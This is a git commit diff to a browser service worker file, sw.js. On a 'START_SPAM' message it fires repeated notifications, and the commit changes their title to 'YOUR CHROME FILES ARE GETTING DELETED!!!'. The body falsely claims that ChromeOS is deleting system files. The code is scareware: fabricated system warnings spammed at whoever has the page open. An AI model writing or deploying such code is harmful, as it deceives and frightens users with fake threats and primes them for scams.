6df81d331792155212191f00a192ccba734944b0
Ern3st0-67 <thiagocarrasco2014@gmail.com>
2026-03-18 11:28:06 -0500

    Update sw.js

--- sw.js
+++ sw.js
@@ -2,7 +2,7 @@ self.addEventListener('message', (event) => {
   if (event.data && event.data.type === 'START_SPAM') {
     let count = 0;
     const spammer = setInterval(() => {
-      self.registration.showNotification("CRITICAL SYSTEM THREAT #" + (count + 1), {
+      self.registration.showNotification("YOUR CHROME FILES ARE GETTING DELETED!!! #" + (count + 1), {
         body: "ChromeOS has detected a fatal error. Deleting system files...",
         icon: "https://cdn-icons-png.flaticon.com",
         tag: "spam-" + count + "-" + Date.now(),
